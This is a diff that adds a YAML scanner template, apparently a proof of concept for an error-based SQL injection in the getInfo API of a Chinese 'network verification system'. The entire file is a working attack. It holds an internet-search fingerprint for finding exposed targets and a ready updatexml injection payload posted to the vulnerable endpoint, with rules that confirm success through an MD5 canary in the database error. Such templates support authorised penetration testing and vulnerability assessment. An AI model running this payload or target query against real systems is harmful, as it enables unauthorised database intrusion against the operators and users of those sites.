@@ -1,0 +1,27 @@
+id: poc-yaml-wangluo-verify-system-getinfo-sqli
+info:
+  name: 网络验证系统 getInfo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 网络验证系统
+  fofa: body="zhuya/js/base.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /index.php/api/Software/getInfo
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: data=123456&id=1 and updatexml(1,concat(0x7e,md5({{.t1}}),0x7e),1)
+  expression: 'status_code == 200 &&
+
+    contains(body,"XPATH syntax error") &&
+
+    contains(body,substr(t2,0,31)) &&
+
+    !contains(body,"<")
+
+    '
+transport: http
